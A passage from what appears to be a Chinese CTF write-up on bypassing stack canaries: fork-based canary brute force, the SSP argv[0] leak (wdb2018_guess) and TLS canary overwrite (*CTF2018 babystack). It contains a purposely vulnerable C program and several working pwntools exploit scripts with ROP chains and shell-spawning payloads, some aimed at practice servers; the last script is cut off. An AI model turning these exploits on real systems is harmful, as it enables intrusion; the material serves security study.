<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">while</span> len(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">            p = process(<span class="string">"./messager"</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">"A"</span>*<span class="number">104</span> + canary + chr(i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.recv()</span><br><span class="line">                canary +=chr(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                p.close()</span><br><span class="line">    leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">leak_canary()</span><br><span class="line">p = process(<span class="string">"./messager"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">s(<span class="string">"A"</span>*<span class="number">104</span>+canary+<span class="string">"A"</span>*<span class="number">8</span>+p64(<span class="number">0x400bc6</span>))</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h3 id="fork中getshell"><a href="#fork中getshell" class="headerlink" title="fork中getshell"></a>fork中getshell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, <span class="built_in">buffer</span>, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();</span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"welcome"</span>);</span><br><span class="line">			vul();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span> + canary + <span class="string">'a'</span>*<span class="number">12</span> + p32(<span class="number">0x80485FB</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">log.success(<span class="string">'flag is:'</span> + flag)</span><br></pre></td></tr></table></figure>
<h2 id="3-3-SSP-Stack-Smashing-Protect-Leak"><a href="#3-3-SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="3.3 SSP(Stack Smashing Protect) Leak"></a>3.3 SSP(Stack Smashing Protect) Leak</h2><p><strong>SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。</strong></p>
<p>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印<code>stack smashing detected</code></p>
<p>看一下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用函数 <code>__fortify_fail()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p><code>__fortify_fail()</code> 调用函数 <code>__libc_message()</code> 打印出错误信息和 <code>argv[0]</code>。</p>
<p>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p>
<p><strong>但这种方法在libc2.26中已经修复</strong>（网上我找的是2.26修复，但有一篇文章是2.25，存疑）</p>
<p>最后我们来看一下 libc-2.25 里的 <code>__stack_chk_fail</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure>
<p>它使用了新函数 <code>__fortify_fail_abort()</code>，这个函数是在 <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=ed421fca42fd9b4cab7c66e77894b8dd7ca57ed0" target="_blank" rel="noopener">BZ #12189</a> 这次提交中新增的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">                    <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg,</span><br><span class="line">                    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">                     ? __libc_argv[<span class="number">0</span>] : <span class="string">"&lt;unknown&gt;"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">true</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure>
<p>函数 <code>__fortify_fail_abort()</code> 在第一个参数为 <code>false</code> 时不再进行栈回溯，直接以打印出字符串 <code>&lt;unknown&gt;</code> 结束，也就没有办法输出 <code>argv[0]</code> 了。</p>
<h3 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221200044056.png" alt="image-20210221200044056"></p>
<p>大概意思就是栈上读取flag.txt，然后让我们猜flag，但这里有fork就很可疑</p>
<p>来复习一下fork</p>
<blockquote>
<p>Unix/Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，<strong>但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</strong></p>
<p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p>
</blockquote>
<p><strong>先说一下思路，我们此时知道flag是在栈上的，无非就是泄露栈上的flag，但具体怎么做呢？</strong></p>
<p><strong>要想泄露栈上的地址，我们这里需要用到<code>__environ</code></strong></p>
<blockquote>
<p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p>
<p>1、得到libc地址后，libc基址+_environ的偏移量=_environ的地址 在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关  </p>
<p>2、通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p>
</blockquote>
<ol>
<li>通过argv[0]泄露got，从而得到基址</li>
<li>泄露environ</li>
<li>泄露flag</li>
</ol>
<p>首先我们要知道get的变量和argv[0]的offset</p>
<p>可以看到是296</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp; __libc_argv[0]</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221223741272.png" alt="image-20210221223741272"></p>
<p>接下来我们还需要知道environ和flag的offset,是360</p>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221224236237.png" alt="image-20210221224236237"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27910</span>)</span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">296</span> + p64(puts_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">environ = libc_base + libc.dump(<span class="string">'_environ'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">environ = uu64(r(<span class="number">6</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ<span class="number">-360</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h2 id="3-4-覆盖-TLS-中储存的-Canary-值"><a href="#3-4-覆盖-TLS-中储存的-Canary-值" class="headerlink" title="3.4 覆盖 TLS 中储存的 Canary 值"></a>3.4 覆盖 TLS 中储存的 Canary 值</h2><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
<blockquote>
<p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p>
<p>glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。</p>
</blockquote>
<h3 id="CTF2018-babystack"><a href="#CTF2018-babystack" class="headerlink" title="*CTF2018 babystack"></a>*CTF2018 babystack</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142851478.png" alt="image-20210222142851478"></p>
<p>说一下主要逻辑，创建一个新的线程，首先是读入size，然后进行读内容</p>
<p>简单看一下这里有栈溢出</p>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142625810.png" alt="image-20210222142625810"></p>
<p>接下来我们就可以利用上面的结论</p>
<ol>
<li>栈溢出覆盖返回地址，泄露libc基址</li>
<li>栈迁移到bss段</li>
<li>ROP</li>
</ol>
<p>先看一下canary</p>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222150721776.png" alt="image-20210222150721776"></p>
<p>看exp把</p>
<blockquote>
<p>不懂为什么/bin/sh本地可以，远程打不通，onegadget可以</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26593</span>)</span><br><span class="line"><span class="comment">#p = process('./bs')</span></span><br><span class="line">elf = ELF(<span class="string">"./bs"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.271.so'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">read_plt = elf.sym[<span class="string">'read'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">put_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="number">0x602f00</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b'A'</span>*<span class="number">0x1010</span> + p64(buf)+ p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(buf+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(read_plt) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">sl(str(<span class="number">0x2000</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\x7f'</span>,<span class="literal">False</span>)[<span class="number">-6</span>:])</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="comment"># sys = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + (libc.search("/bin/sh")).next()</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher('puts',puts)</span></span><br><span class="line"><span class="comment"># libc_base = puts - libc.dump('puts')</span></span><br><span class="line"><span class="comment"># leak("libc_base",libc_base)</span></span><br><span class="line"><span class="comment"># sys = libc_base + libc.dump('system')</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + 